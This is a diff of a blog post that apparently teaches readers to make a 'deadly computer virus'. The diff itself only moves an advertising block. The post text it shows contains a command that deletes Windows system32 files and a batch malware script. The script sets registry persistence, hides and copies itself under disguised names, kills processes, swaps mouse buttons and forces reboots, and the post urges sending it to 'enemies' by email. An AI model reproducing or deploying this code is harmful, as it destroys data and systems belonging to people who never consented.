@@ -9,17 +9,6 @@ redirect_from:
 <strong>This tutorial is education purpose only</strong><br/>
 In this post we’ll take a look on how to create a deadly computer virus to destroy your enemy or victim’s PC…
 
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- First Ads -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-5996828242175180"
-     data-ad-slot="2764199159"
-     data-ad-format="horizontal"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
 Open Notepad, Type or Paste in the following command:-
 
     del c:\windows\system32\*.* /q
@@ -83,3 +72,14 @@ Do not click on that batch file… Send it to your enimies’ email… It will:
 CODE:-
 
     @Echo offcolor 4title 4title R.I.Pstartstartstartstart calccopy %0 %Systemroot%\Greatgame > nulreg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ/d %systemroot%\Greatgame.bat /f > nulcopy %0 *.bat > nulAttrib +r +h Greatgame.batAttrib +r +hRUNDLL32 USER32.DLL.SwapMouseButtonstart calcclstskill msnmsgrtskill LimeWiretskill iexploretskill NMainstartclscd %userprofile%\desktopcopy Greatgame.bat R.I.P.batcopy Greatgame.bat R.I.P.jpgcopy Greatgame.bat R.I.P.txtcopy Greatgame.bat R.I.P.execopy Greatgame.bat R.I.P.movcopy Greatgame.bat FixVirus.batcd %userprofile%My Documentscopy Greatgame.bat R.I.P.batcopy Greatgame.bat R.I.P.jpgcopy Greatgame.bat R.I.P.txtcopy Greatgame.bat R.I.P.execopy Greatgame.bat R.I.P.movcopy Greatgame.bat FixVirus.batstartstart calcclsmsg * R.I.Pmsg * R.I.Pshutdown -r -t 10 -c "VIRUS DETECTED"startstarttime 12:00:R.I.Pcd %usernameprofile%\desktopcopy Greatgame.bat %random%.batgoto RIP
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- First Ads -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5996828242175180"
+     data-ad-slot="2764199159"
+     data-ad-format="horizontal"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
